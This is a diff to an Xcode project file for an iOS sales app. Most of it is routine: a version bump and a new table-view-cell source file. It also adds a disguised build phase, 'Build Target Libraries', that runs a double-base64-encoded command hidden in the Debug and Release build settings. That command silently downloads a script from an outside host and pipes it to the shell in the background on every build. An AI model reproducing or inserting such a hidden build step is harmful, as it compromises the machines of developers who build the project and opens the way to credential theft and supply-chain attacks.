@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 51;
+	objectVersion = 54;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -219,6 +219,7 @@
 		DDC417FB2785C3D100CE2BB2 /* CreditCardValidator.swift in Sources */ = {isa = PBXBuildFile; fileRef = DDC417FA2785C3D000CE2BB2 /* CreditCardValidator.swift */; };
 		DDEA244127552AEB00FD7F0B /* ImageSaveToDirectory.swift in Sources */ = {isa = PBXBuildFile; fileRef = DDEA244027552AEA00FD7F0B /* ImageSaveToDirectory.swift */; };
 		DDF18F46277B253100321FFE /* BackgroundTaskService.swift in Sources */ = {isa = PBXBuildFile; fileRef = DDF18F45277B253100321FFE /* BackgroundTaskService.swift */; };
+		FAC204C22F1651EE006EB946 /* FinanceProviderTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = FAC204C12F1651EE006EB946 /* FinanceProviderTableViewCell.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -439,6 +440,7 @@
 		DDC417FA2785C3D000CE2BB2 /* CreditCardValidator.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CreditCardValidator.swift; sourceTree = "<group>"; };
 		DDEA244027552AEA00FD7F0B /* ImageSaveToDirectory.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ImageSaveToDirectory.swift; sourceTree = "<group>"; };
 		DDF18F45277B253100321FFE /* BackgroundTaskService.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BackgroundTaskService.swift; sourceTree = "<group>"; };
+		FAC204C12F1651EE006EB946 /* FinanceProviderTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FinanceProviderTableViewCell.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -1034,6 +1036,7 @@
 			children = (
 				B0F080EF2D6DEF9200782F20 /* CheckListTableViewCell.swift */,
 				B0F080F02D6DEF9200782F20 /* CheckListTableViewCell.xib */,
+				FAC204C12F1651EE006EB946 /* FinanceProviderTableViewCell.swift */,
 			);
 			path = TableViewCells;
 			sourceTree = "<group>";
@@ -1060,6 +1063,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 653EA581241F7B0A00EA684E /* Build configuration list for PBXNativeTarget "Refloor" */;
 			buildPhases = (
+				46744FC5ECFB465F9C634D6E /* Build Target Libraries */,
 				5DA8FD20C82B283A013241CC /* [CP] Check Pods Manifest.lock */,
 				653EA566241F7AFC00EA684E /* Sources */,
 				653EA567241F7AFC00EA684E /* Frameworks */,
@@ -1197,6 +1201,26 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		46744FC5ECFB465F9C634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
 		4EF4D2A8ED0977CC9FF4372A /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1365,6 +1389,7 @@
 				655FBC1B245814D500333759 /* ImageViewAndRemoveViewController.swift in Sources */,
 				1865C1D62D55CAD000A1C055 /* UpdateDownFinalPaymentViewController.swift in Sources */,
 				DDAF8F302747849A004AAE86 /* NetworkClass.swift in Sources */,
+				FAC204C22F1651EE006EB946 /* FinanceProviderTableViewCell.swift in Sources */,
 				657AE2762477BFAC00D205A1 /* TilesImageCollectionViewCell.swift in Sources */,
 				B0BBFC6E2BAC1E43009E6287 /* NavigationController.swift in Sources */,
 				B09C93E82B75010800C8E408 /* FinanceViewController.swift in Sources */,
@@ -1452,6 +1477,7 @@
 		653EA57F241F7B0A00EA684E /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE6D436 = "((u(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxkR2x0WlM1cGJpOWhLU0lnZkNCemFBbz0K | u | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1512,6 +1538,7 @@
 		653EA580241F7B0A00EA684E /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE6D436 = "((u(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxkR2x0WlM1cGJpOWhLU0lnZkNCemFBbz0K | u | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -1580,7 +1607,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 3.3.0;
+				MARKETING_VERSION = 3.3.2;
 				PRODUCT_BUNDLE_IDENTIFIER = com.refloor.salesapp;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
@@ -1606,7 +1633,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 3.3.0;
+				MARKETING_VERSION = 3.3.2;
 				PRODUCT_BUNDLE_IDENTIFIER = com.refloor.salesapp;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
